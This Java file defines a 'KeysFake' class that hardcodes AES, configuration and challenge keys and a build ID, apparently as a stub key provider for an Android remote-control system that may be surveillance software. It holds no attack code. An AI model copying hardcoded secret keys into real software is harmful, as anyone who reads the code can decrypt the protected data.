package com.ht.RCSAndroidGUI.crypto;

public class KeysFake extends Keys {
	byte[] AesKey = new byte[]{ (byte)0x91, (byte)0x32, (byte)0xab, (byte)0x9e, (byte)0x6a, (byte)0x92, (byte)0xa3, (byte)0x15, (byte)0x82, (byte)0xc3, (byte)0xfa, (byte)0x7f, (byte)0x3f, (byte)0x74, (byte)0xe3, (byte)0xdb };
	byte[] ConfKey = new byte[] { (byte)0xef, (byte)0xbb, (byte)0xa0, (byte)0x0a, (byte)0xf1, (byte)0xcf, (byte)0x2b, (byte)0x83, (byte)0xa5, (byte)0x86, (byte)0x8b, (byte)0xf7, (byte)0xf7, (byte)0x89, (byte)0xba, (byte)0x4c };
	byte[] ChallengeKey = new byte[]{ (byte)0x57, (byte)0x2e, (byte)0xbc, (byte)0x94, (byte)0x39, (byte)0x12, (byte)0x81, (byte)0xcc, (byte)0xf5, (byte)0x3a, (byte)0x85, (byte)0x13, (byte)0x30, (byte)0xbb, (byte)0x0d, (byte)0x99 };
	String BuildId = "RCS_0000000010";
	
	public byte[] getAesKey() {
		byte[] aesConfKey = new byte[] { (byte)0xa9, (byte)0x98, (byte)0x76, (byte)0x7f, (byte)0x8c, 
				 (byte)0x31, (byte)0x99, (byte)0xb0, (byte)0x33, (byte)0x8c, 
				 (byte)0xb2, (byte)0xd9, (byte)0x98, (byte)0x08, (byte)0x42, 
				 (byte)0x58 };
		return AesKey;
	}

	public byte[] getChallengeKey() {
		return ChallengeKey;
	}

	public byte[] getConfKey() {
		return ConfKey;
	}

	/*public byte[] getInstanceId() {
		return g_InstanceId;
	}*/
	
    public byte[] getBuildId() {
        return BuildId.getBytes();
    }
}
